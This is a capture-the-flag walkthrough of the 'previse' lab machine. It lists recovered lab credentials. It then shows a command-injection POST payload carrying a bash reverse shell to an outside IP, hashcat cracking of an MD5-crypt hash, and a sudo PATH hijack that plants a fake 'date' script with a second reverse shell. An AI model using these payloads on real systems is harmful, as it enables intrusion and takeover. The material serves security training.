## Info
### Credential
 User   | Password        | Service | Note
--------|-----------------|---------|------
admin   |admin            |website  |
root    |mySQL_p@ssw0rd!:)|MySQL    |db_name=previse
m4lwhere|ilovecody112235! |         |

### Website


## Path
### User
1. Login the website with common credential `admin:admin`.
2. Found the website backup file `siteBackup.zip` at `/files.php/`, which contain the MySQL credential.
```
$host = 'localhost';
$user = 'root';
$passwd = 'mySQL_p@ssw0rd!:)';
$db = 'previse';
```
3. `logs.php` is vulnerable to command injection. We can get reverse shell by the following request.
```
# logs.php
$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");

# Request
delim=comma;bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.20/13337+0>%261'
```
4. Found `m4lwhere`'s hash in the MySQL database, then crack it with `hashcat`.
```
# MySQL
mysql> select * from accounts;
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |

# hashcat
$ hashcat --username --force -m 500 m4lwhere.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
...
$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
```
5. Login as `m4lwhere` and get the user flag.

### Root
1. `m4lwhere` can run `/opt/scripts/access_backup.sh` as root.
```
m4lwhere@previse:/opt$ sudo -l
[sudo] password for m4lwhere:
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```
2. Since `date` doesn't specify the absolute path, I tried to hijack the binary search path and get good luck. Got the root flag.
```
m4lwhere@previse:/dev/shm$ echo "bash -c 'bash -i >& /dev/tcp/10.10.17.233/13337 0>&1'" > date
m4lwhere@previse:/dev/shm$ chmod +x date
m4lwhere@previse:/dev/shm$ PATH=/dev/shm:$PATH sudo /opt/scripts/access_backup.sh
 
# Rev Shell
$ nc -lvnp 13337
Listening on 0.0.0.0 13337
Connection received on 10.10.11.104 53124
root@previse:/dev/shm# whoami
root
```

3. From `root`, we can see that the `secure_path`, which is the default setting to prevent path hijacking, was turned off, so we can do the trick.
```
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
#Defaults       env_reset
#Defaults       mail_badpass
#Defaults       secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
# Allow manual backups of access logs as needed
m4lwhere ALL=(root) /opt/scripts/access_backup.sh
```

